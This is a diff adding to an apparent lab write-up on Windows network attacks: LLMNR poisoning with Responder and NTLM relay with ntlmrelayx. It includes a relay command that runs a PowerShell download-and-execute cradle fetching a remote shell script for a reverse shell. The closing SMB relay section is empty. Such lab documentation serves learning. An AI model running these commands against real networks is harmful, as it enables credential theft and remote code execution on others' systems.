@@ -18,6 +18,40 @@ Kali Linux is the Perpetrator machine used in this
 # Tools Used
 | Tool | Purpose |
 | --- | --- |
-| Responder | LLMNR/NBT-NS poisioning, credential capture |
+| nmap | map the network, view the services active, service version |
+| Responder | LLMNR/NBT-NS poisioning, credential capture, NTLM shell invoke |
 | Ipmacket-ntlmrelayx | SMB relay attacks |
+| netcat | capture the shell |
+| psexec | Pass the hash to gain shell |
+| John | crack the hashes captured |
+
+# Attack Techniques Covered
+
+1. Initial Enumeration
+Used the nmap to view all the services running in the host and domain controller, ports used and the servic version. Focused mostly on smb as it was the main focus of this lab.
+
+3. LLMNR Poisioning
+Exploited the Link-local Multicast Name Resolution (LLMNR) protocol to capture NTLMv2 hashes from machines attempting to resolve hostnames on the network.
+```
+sudo responder -I eth0 -dPv
+```
+When a Windows machine fails DNS resolution, it broadcasts an LLMNR query. Responder intercepts this and responds, causing the victim to authenticate — sending their NTLMv2 hash.
+
+3. NTLM shell invoke using responder
+The attack leverages NTLM relay via WPAD/LLMNR poisoning to capture and forward authentication attempts to a target system lacking SMB signing. The relayed session is then used to execute a remotely hosted PowerShell script, resulting in arbitrary command execution and a reverse shell connection.
+```
+sudo responder -I eth0 -dwv
+```
+```
+impacket-ntlmrelayx -tf iptargets.txt -smb2support -c "powershell IEX(NEW-Object Net.WebClient).downloadString('http://192.168.0.69:80000/Downloads/shells.ps1')"
+```
+When a Windows machine fails DNS resolution, it sends out an LLMNR/WPAD broadcast to find the requested host. Responder intercepts this request and replies as the legitimate server, forcing the victim to authenticate to the attacker. The victim then sends an NTLMv2 authentication challenge-response, which can be captured and relayed using ntlmrelayx to another target, where it is accepted as valid and used for remote execution.
+
+4. SMB relay
+
+
+
+
+   
+   
 
